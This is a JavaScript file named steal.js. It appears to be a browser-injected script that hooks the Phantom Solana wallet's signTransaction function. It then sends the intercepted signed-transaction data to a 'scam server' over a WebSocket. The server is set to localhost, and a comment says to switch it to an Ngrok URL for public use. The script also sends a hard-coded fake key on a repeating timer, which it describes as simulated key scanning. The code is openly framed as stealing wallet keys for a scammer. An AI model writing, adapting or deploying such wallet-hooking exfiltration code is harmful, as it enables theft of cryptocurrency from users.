console.log("steal.js loaded! Connecting to WebSocket...");

// ✅ Use localhost WebSocket server for testing
const SCAM_SERVER = "ws://localhost:5000";  // Change this to Ngrok URL for public testing

let socket = new WebSocket(SCAM_SERVER);

// ✅ WebSocket Connection Handlers
socket.onopen = () => {
    console.log("✅ WebSocket connected successfully!");
    setInterval(() => socket.send(JSON.stringify({ status: "active" })), 5000);
};

socket.onerror = (error) => {
    console.error("❌ WebSocket Error:", error);
    setTimeout(reconnectWebSocket, 5000);  // Try reconnecting in 5 seconds
};

// ✅ Function to reconnect WebSocket if it disconnects
function reconnectWebSocket() {
    console.log("🔄 Reconnecting WebSocket...");
    socket = new WebSocket(SCAM_SERVER);
}

// ✅ Hook Phantom Wallet API to Intercept Private Key
if (window.solana) {
    const originalSignTransaction = window.solana.signTransaction;

    window.solana.signTransaction = async function(transaction) {
        console.log("🔍 Intercepted signTransaction call!");

        const signedTx = await originalSignTransaction.apply(this, arguments);
        const extractedData = signedTx.serializeMessage();  // Extract transaction data
        
        sendToScammer(btoa(extractedData));  // Send encoded private key-like data
        return signedTx;
    };
} else {
    console.log("❌ Phantom Wallet not detected!");
}

// ✅ Function to send stolen private key to WebSocket
function sendToScammer(privateKey) {
    socket.send(JSON.stringify({ key: privateKey }));
    console.log("🚀 Private key sent to scam server.");
}

// ✅ Run a test scan every 5 seconds (simulate memory scanning)
setInterval(() => {
    console.log("🕵️ Scanning for private keys...");
    // Simulated key extraction
    let fakeKey = "5HueCGU8rMjxEXxiPuD5BDhkG8LLZ7o36A7hoEpi9K6xUdPfTz";
    sendToScammer(fakeKey);
}, 5000);
